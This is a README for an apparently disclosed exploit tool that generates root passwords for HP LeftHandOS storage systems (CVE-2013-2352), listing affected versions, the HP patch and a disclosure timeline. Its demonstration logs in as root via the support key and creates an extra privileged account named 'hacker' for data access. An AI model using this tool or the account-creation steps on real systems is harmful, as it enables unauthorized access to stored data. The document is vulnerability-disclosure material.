LHNSKEY
=========

Generator for CVE-2013-2352.

By: technion@lolware.net

Affected Platforms:
    All Hardware and sofware implementations running LeftHandOS 10.5 or earlier, including Failover Manager and VSA.

Fix:
    Apply HP Patch 10152 (LefthandOS 10.5) or 10151 (LefthandOS 10.0).

Revision History:
----------------
    2nd July 2013: Initial design
    3th July 2013: Consulted with HP
    17th July 2013: HP Released Patch

Demonstration:
-------------
The lhnskey application will create an appropriate root password based on the support key encountered during logon.
I recommend the following site to create the s/key response: http://www.ocf.berkeley.edu/~jjlin/jsotp/md5/

    login as: root
    Support Key: 00:0C:29:XX:XX:XX
    Using keyboard-interactive authentication.
    Password:
    Using keyboard-interactive authentication.
    challenge s/key 99 loca11277
    password:

    #You may then grant yourself access to data by creating a CMC account
    [root@localhost lefthand]# adduser hacker 
    [root@localhost lefthand]# passwd hacker Changing password for user hacker.
    New UNIX password: <password>
    BAD PASSWORD: it is based on a dictionary word 
    Retype new UNIX password: <password>
    passwd: all authentication tokens updated successfully.
    [root@localhost lefthand]# chsh hacker
    Changing shell for hacker.
    New shell [/bin/bash]: /etc/lefthand/bin/cliq Shell changed.


Installation
The official repository for lhnskey is the git tree. Install using the following:
    git clone https://github.com/technion/lhnskey
    ./configure
    make
    make check

The ./configure script accepts some options:
    --enable-development enable developer features default=no
    --enable-secure turn on security features default=yes
The autoconf script will link against OpenSSL if detected, otherwise, a shipped md5.c will be compiled in.
